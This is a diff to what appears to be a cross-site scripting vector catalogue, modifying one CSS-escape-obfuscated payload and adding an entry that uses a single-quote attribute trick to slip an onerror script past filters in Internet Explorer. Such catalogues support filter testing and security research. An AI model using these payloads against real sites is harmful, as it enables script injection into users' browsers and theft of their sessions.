@@ -1909,7 +1909,7 @@ var items =
             'ru' : 'CSS-кодирование и добавление обратного слеша',
             'de' : ''
         },
-        'data'       : '<div style="\\000062\\00065\\68\\0\\00	\\000061 vior:url\\28#default#time2);\\-\\&#x0A\\&#x0A\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E ding:url(moztest.xml#xss);\\-\\00006F\\0002d\\6C&#x0A\\69 \\6e	\\00006B:\'%js_uri_alert%\';\\-\\00006F\\0002d\\6C&#x0A\\69 \\6e	\\00006B-source:current" end=0 onend=%js_alert%>XXX',
+        'data'       : '<div style="\\000062\\00065\\68\\0\\00	\\000061 vior:url\\28#default#time2);\\-\\\n\\\n\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E ding:url(moztest.xml#xss);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B:\'%js_uri_alert%\';\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B-source:current" end=0 onend=%js_alert%>XXX',
         'attachment' : {
             'required_mime' : '',
             'samedomain'    : '1',            
@@ -1937,5 +1937,36 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'css', 'encoding', 'escape', 'backslash', 'opera', 'firefox', 'internet explorer'],
         'reporter'   : 'Gareth, LeverOne,'
+    },
+    { /* ID 62 - Simulating attribute in IE */
+        'id'         : 62,
+        'category'   : 'html', 
+        'name'       : {
+            'en' : 'Simulating attribute in IE',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<x \'="foo"><x foo=\'><img src=x onerror=alert(1)//\'>',
+        'description': {
+            'en' : 'This vector is simulated using in IE a single quote as an attribute to trick filters',
+            'ja' : '',
+            'ru' : 'Этот вектор симулирует использование в IE одиночной кавычки в качестве атрибута, чтобы обмануть фильтры.',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'internet explorer': [
+                '6.0', '7.0', '8.0', '9.0'
+            ]                       
+        },
+        'tags'       : ['xss', 'javascript', 'attribute', 'simulating', 'parser', 'regex'],
+        'reporter'   : 'Algol, LeverOne, White Jordan'
     }
 ]
